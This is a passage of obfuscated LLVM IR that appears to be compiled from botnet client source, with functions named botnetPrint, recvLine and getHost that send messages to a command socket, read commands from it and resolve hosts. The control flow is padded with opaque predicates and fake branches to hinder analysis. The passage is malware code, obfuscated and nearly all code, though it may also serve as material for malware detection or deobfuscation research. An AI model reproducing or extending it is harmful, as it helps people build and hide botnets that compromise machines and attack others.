originalBB84alteredBB:                            ; preds = %originalBB84, %481
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %498
  %601 = load i8**, i8*** %4, align 8
  %602 = load i8*, i8** %5, align 8
  %603 = load i8, i8* %602, align 1
  %604 = zext i8 %603 to i32
  call void @printchar(i8** %601, i32 %604)
  %605 = load i32, i32* %9, align 4
  %_89 = sub i32 0, %605
  %gen90 = add i32 %_89, 1
  %606 = add nsw i32 %605, 1
  store i32 %606, i32* %9, align 4
  br label %originalBB88
}

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #3
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #9
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #3
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %44

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* @x.35
  %27 = load i32, i32* @y.36
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %34 = load i32, i32* %4, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:44:                                     ; preds = %10
  %45 = load i32, i32* @x.35
  %46 = load i32, i32* @y.36
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %44
  %53 = load i32, i32* @x.35
  %54 = load i32, i32* @y.36
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %61

; <label>:61:                                     ; preds = %originalBBpart220, %originalBBpart27
  %62 = load i32, i32* @x.35
  %63 = load i32, i32* @y.36
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %61
  %70 = load i32, i32* %5, align 4
  %71 = load i32, i32* %4, align 4
  %72 = icmp sge i32 %70, %71
  %73 = load i32, i32* @x.35
  %74 = load i32, i32* @y.36
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %72, label %81, label %96

; <label>:81:                                     ; preds = %originalBBpart211
  %82 = call i16** @__ctype_b_loc() #10
  %83 = load i16*, i16** %82, align 8
  %84 = load i8*, i8** %2, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load i8, i8* %87, align 1
  %89 = sext i8 %88 to i32
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i16, i16* %83, i64 %90
  %92 = load i16, i16* %91, align 2
  %93 = zext i16 %92 to i32
  %94 = and i32 %93, 8192
  %95 = icmp ne i32 %94, 0
  br label %96

; <label>:96:                                     ; preds = %81, %originalBBpart211
  %97 = phi i1 [ false, %originalBBpart211 ], [ %95, %81 ]
  br i1 %97, label %98, label %117

; <label>:98:                                     ; preds = %96
  %99 = load i32, i32* @x.35
  %100 = load i32, i32* @y.36
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %98
  %107 = load i32, i32* %5, align 4
  %108 = add nsw i32 %107, -1
  store i32 %108, i32* %5, align 4
  %109 = load i32, i32* @x.35
  %110 = load i32, i32* @y.36
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart220, label %originalBB13alteredBB

originalBBpart220:                                ; preds = %originalBB13
  br label %61

; <label>:117:                                    ; preds = %96
  %118 = load i32, i32* %4, align 4
  store i32 %118, i32* %3, align 4
  br label %119

; <label>:119:                                    ; preds = %151, %117
  %120 = load i32, i32* @x.35
  %121 = load i32, i32* @y.36
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %119
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %5, align 4
  %130 = icmp sle i32 %128, %129
  %131 = load i32, i32* @x.35
  %132 = load i32, i32* @y.36
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %130, label %139, label %154

; <label>:139:                                    ; preds = %originalBBpart224
  %140 = load i8*, i8** %2, align 8
  %141 = load i32, i32* %3, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %140, i64 %142
  %144 = load i8, i8* %143, align 1
  %145 = load i8*, i8** %2, align 8
  %146 = load i32, i32* %3, align 4
  %147 = load i32, i32* %4, align 4
  %148 = sub nsw i32 %146, %147
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8, i8* %145, i64 %149
  store i8 %144, i8* %150, align 1
  br label %151

; <label>:151:                                    ; preds = %139
  %152 = load i32, i32* %3, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %3, align 4
  br label %119

; <label>:154:                                    ; preds = %originalBBpart224
  %155 = load i32, i32* @x.35
  %156 = load i32, i32* @y.36
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %154
  %163 = load i8*, i8** %2, align 8
  %164 = load i32, i32* %3, align 4
  %165 = load i32, i32* %4, align 4
  %166 = sub nsw i32 %164, %165
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %163, i64 %167
  store i8 0, i8* %168, align 1
  %169 = load i32, i32* @x.35
  %170 = load i32, i32* @y.36
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart238, label %originalBB26alteredBB

originalBBpart238:                                ; preds = %originalBB26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %25
  %177 = load i32, i32* %4, align 4
  %_ = sub i32 %177, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %177, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 %177, 1
  %gen4 = mul i32 %_3, 1
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %4, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %44
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %61
  %179 = load i32, i32* %5, align 4
  %180 = load i32, i32* %4, align 4
  %181 = icmp sge i32 %179, %180
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %98
  %182 = load i32, i32* %5, align 4
  %_14 = sub i32 %182, -1
  %gen15 = mul i32 %_14, -1
  %_16 = sub i32 %182, -1
  %gen17 = mul i32 %_16, -1
  %_18 = shl i32 %182, -1
  %183 = add nsw i32 %182, -1
  store i32 %183, i32* %5, align 4
  br label %originalBB13

originalBB22alteredBB:                            ; preds = %originalBB22, %119
  %184 = load i32, i32* %3, align 4
  %185 = load i32, i32* %5, align 4
  %186 = icmp sle i32 %184, %185
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %154
  %187 = load i8*, i8** %2, align 8
  %188 = load i32, i32* %3, align 4
  %189 = load i32, i32* %4, align 4
  %_27 = sub i32 %188, %189
  %gen28 = mul i32 %_27, %189
  %_29 = sub i32 %188, %189
  %gen30 = mul i32 %_29, %189
  %_31 = shl i32 %188, %189
  %_32 = shl i32 %188, %189
  %_33 = sub i32 %188, %189
  %gen34 = mul i32 %_33, %189
  %_35 = sub i32 0, %188
  %gen36 = add i32 %_35, %189
  %190 = sub nsw i32 %188, %189
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8, i8* %187, i64 %191
  store i8 0, i8* %192, align 1
  br label %originalBB26
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.37
  %4 = load i32, i32* @y.38
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #3
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.37
  %21 = load i32, i32* @y.38
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %45

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* @x.37
  %30 = load i32, i32* @y.38
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  store i32 1, i32* %11, align 4
  %37 = load i32, i32* @x.37
  %38 = load i32, i32* @y.38
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %46

; <label>:46:                                     ; preds = %45, %originalBBpart24
  %47 = load i32, i32* @x.37
  %48 = load i32, i32* @y.38
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load i32, i32* %11, align 4
  %56 = load i32, i32* @x.37
  %57 = load i32, i32* @y.38
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %2
  %64 = alloca i32, align 4
  %65 = alloca i8*, align 8
  %66 = alloca %struct.in_addr*, align 8
  %67 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %65, align 8
  store %struct.in_addr* %1, %struct.in_addr** %66, align 8
  %68 = load i8*, i8** %65, align 8
  %69 = call i32 @inet_addr(i8* %68) #3
  %70 = load %struct.in_addr*, %struct.in_addr** %66, align 8
  %71 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %70, i32 0, i32 0
  store i32 %69, i32* %71, align 4
  %72 = icmp eq i32 %69, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  store i32 1, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %73 = load i32, i32* %11, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = load i32, i32* @x.39
  %26 = load i32, i32* @y.40
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %33, i64 0, i64 0
  %35 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %34) #3, !srcloc !1
  %36 = extractvalue { i64, i64* } %35, 0
  %37 = extractvalue { i64, i64* } %35, 1
  %38 = trunc i64 %36 to i32
  store i32 %38, i32* %10, align 4
  %39 = ptrtoint i64* %37 to i64
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* @x.39
  %42 = load i32, i32* @y.40
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* %5, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %55 = load i32, i32* %5, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %5, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %63, i32* %12, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %150

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %originalBBpart216, %65
  %67 = load i32, i32* @x.39
  %68 = load i32, i32* @y.40
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %13, align 4
  %76 = icmp slt i32 %75, 10
  %77 = load i32, i32* @x.39
  %78 = load i32, i32* @y.40
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %149

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* @x.39
  %87 = load i32, i32* @y.40
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %94, align 8
  %95 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %95, align 8
  %96 = load i32, i32* @x.39
  %97 = load i32, i32* @y.40
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %104

; <label>:104:                                    ; preds = %originalBBpart28
  %105 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %105, i64 0, i64 0
  %107 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %106) #3, !srcloc !2
  %108 = extractvalue { i64, i64* } %107, 0
  %109 = extractvalue { i64, i64* } %107, 1
  %110 = trunc i64 %108 to i32
  store i32 %110, i32* %14, align 4
  %111 = ptrtoint i64* %109 to i64
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %15, align 4
  br label %113

; <label>:113:                                    ; preds = %104
  %114 = load i32, i32* %5, align 4
  %115 = srem i32 %114, 64
  %116 = zext i32 %115 to i64
  %117 = shl i64 1, %116
  %118 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %119 = load i32, i32* %5, align 4
  %120 = sdiv i32 %119, 64
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 %121
  %123 = load i64, i64* %122, align 8
  %124 = or i64 %123, %117
  store i64 %124, i64* %122, align 8
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %127, i32* %12, align 4
  %128 = icmp sle i32 %127, 0
  br i1 %128, label %129, label %148

; <label>:129:                                    ; preds = %113
  %130 = load i32, i32* @x.39
  %131 = load i32, i32* @y.40
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %129
  %138 = load i32, i32* %13, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %13, align 4
  %140 = load i32, i32* @x.39
  %141 = load i32, i32* @y.40
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart216, label %originalBB10alteredBB

originalBBpart216:                                ; preds = %originalBB10
  br label %66

; <label>:148:                                    ; preds = %113
  br label %149

; <label>:149:                                    ; preds = %148, %originalBBpart24
  br label %150

; <label>:150:                                    ; preds = %149, %49
  %151 = load i32, i32* @x.39
  %152 = load i32, i32* @y.40
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %150
  store i32 0, i32* %18, align 4
  %159 = load i8*, i8** %6, align 8
  store i8* %159, i8** %17, align 8
  %160 = load i32, i32* @x.39
  %161 = load i32, i32* @y.40
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %168

; <label>:168:                                    ; preds = %originalBBpart248, %originalBBpart220
  %169 = load i32, i32* %7, align 4
  %170 = add nsw i32 %169, -1
  store i32 %170, i32* %7, align 4
  %171 = icmp sgt i32 %169, 1
  br i1 %171, label %172, label %237

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* @KadenCommStock, align 4
  %174 = call i64 @recv(i32 %173, i8* %16, i64 1, i32 0)
  %175 = icmp ne i64 %174, 1
  br i1 %175, label %176, label %194

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* @x.39
  %178 = load i32, i32* @y.40
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %176
  %185 = load i8*, i8** %17, align 8
  store i8 0, i8* %185, align 1
  store i32 -1, i32* %4, align 4
  %186 = load i32, i32* @x.39
  %187 = load i32, i32* @y.40
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %240

; <label>:194:                                    ; preds = %172
  %195 = load i8, i8* %16, align 1
  %196 = load i8*, i8** %17, align 8
  %197 = getelementptr inbounds i8, i8* %196, i32 1
  store i8* %197, i8** %17, align 8
  store i8 %195, i8* %196, align 1
  %198 = load i8, i8* %16, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 10
  br i1 %200, label %201, label %218

; <label>:201:                                    ; preds = %194
  %202 = load i32, i32* @x.39
  %203 = load i32, i32* @y.40
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %201
  %210 = load i32, i32* @x.39
  %211 = load i32, i32* @y.40
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %237

; <label>:218:                                    ; preds = %194
  %219 = load i32, i32* @x.39
  %220 = load i32, i32* @y.40
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %218
  %227 = load i32, i32* %18, align 4
  %228 = add nsw i32 %227, 1
  store i32 %228, i32* %18, align 4
  %229 = load i32, i32* @x.39
  %230 = load i32, i32* @y.40
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
